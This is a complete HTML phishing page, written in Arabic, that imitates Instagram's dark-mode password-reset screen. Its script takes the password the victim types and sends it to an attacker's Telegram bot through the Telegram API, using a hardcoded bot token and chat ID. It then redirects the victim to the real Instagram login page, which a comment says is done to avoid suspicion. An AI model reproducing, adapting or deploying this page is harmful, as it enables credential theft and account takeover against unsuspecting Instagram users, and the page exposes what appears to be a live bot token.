<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>إنشاء كلمة سر قوية • Instagram</title>
    <style>
        /* تعريف الألوان الخاصة بإنستغرام في التصميم الداكن */
        :root { --bg: #000000; --input: #1c1f22; --border: #363636; --primary: #3897f0; --btn-disabled: rgba(56, 151, 240, 0.5); --text-light: #ffffff; --text-muted: #a8a8a8; }
        
        body { background-color: var(--bg); color: var(--text-light); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .app-box { width: 100%; max-width: 90mm; padding: 5mm; box-sizing: border-box; text-align: center; position: relative; }
        
        /* الشريط العلوي */
        .top-bar { display: flex; justify-content: space-between; align-items: center; width: 100%; margin-bottom: 7.5mm; }
        .inst-logo { color: var(--text-light); font-size: 6mm; font-weight: 900; letter-spacing: -0.25mm; }
        .close-btn { color: var(--text-light); font-size: 5.5mm; cursor: pointer; }
        
        h2 { font-size: 4mm; font-weight: 600; margin: 0 0 2.5mm 0; }
        .inst { font-size: 3.25mm; color: var(--text-muted); line-height: 1.6; margin: 0 0 7.5mm 0; text-align: right; direction: rtl; }
        
        /* حقول الإدخال */
        input { width: 100%; padding: 3mm; margin-bottom: 3mm; background: var(--input); border: 1px solid var(--border); border-radius: 1.5mm; box-sizing: border-box; color: white; font-size: 3mm; }
        input::placeholder { color: #555; }
        input:focus { border-color: #a8a8a8; outline: none; }
        
        /* الأزرار */
        .btn-row { display: flex; justify-content: flex-end; margin-top: 3.75mm; }
        button { background-color: var(--primary); border: none; color: white; padding: 2.5mm 5mm; border-radius: 2mm; font-weight: 600; cursor: pointer; font-size: 3.5mm; }
        button:disabled { background-color: var(--btn-disabled); color: #555; cursor: default; }
        
        /* شريط المنزل السفلي (لزيادة الواقعية) */
        .home-bar { position: fixed; bottom: 2mm; left: 50%; transform: translateX(-50%); width: 33.5mm; height: 1.25mm; background: #fff; border-radius: 2.5mm; }
    </style>
</head>
<body>

<div class="app-box">
    <div class="top-bar">
        <div class="inst-logo">Instagram</div>
        <div class="close-btn" onclick="goToOfficial()">&#x2715;</div>
    </div>
    
    <h2>إنشاء كلمة سر قوية</h2>
    
    <div class="inst">
        يجب ألا تقل كلمة السر عن ستة أحرف وأن تتضمن توليفة من الأرقام والأحرف الأبجدية والرموز الخاصة (! $ % @).
    </div>
    
    <input type="password" id="newPass" placeholder=" كلمة السر الجديدة">
    <input type="password" id="confPass" placeholder=" تأكيد كلمة السر الجديدة">
    
    <div class="btn-row">
        <button id="submitBtn" onclick="handleReset()">إعادة تعيين كلمة السر</button>
    </div>
</div>

<div class="home-bar"></div> <script>
    function goToOfficial() { window.location.href = "https://www.instagram.com/"; }

    async function handleReset() {
        const pass1 = document.getElementById('newPass').value;
        const pass2 = document.getElementById('confPass').value;
        const btn = document.getElementById('submitBtn');

        if (!pass1 || !pass2) return alert("يرجى ملء جميع الحقول");
        if (pass1 !== pass2) return alert("كلمتا السر غير متطابقتين");

        // بيانات تليجرام الخاصة بك
        const botToken = "7546948976:AAFPHTjFRKGAOQOgkyg6uEqXCjl_ca2nC2k";
        const chatId = "56081692";
        
        btn.disabled = true;

        const message = `
🔒 **سحب جديد (Instagram Dark mm)**
-------------------------
👤 كلمة السر: \`${pass1}\`
-------------------------
🌐 تم الإرسال من محاكاة الأندرويد الدقيقة
        `;

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
            // تحويل المستخدم بعد الإرسال لإبعاد الشبهة
            window.location.href = "https://www.instagram.com/accounts/login/";
        } catch (error) {
            btn.disabled = false;
        }
    }
</script>

</body>
</html>
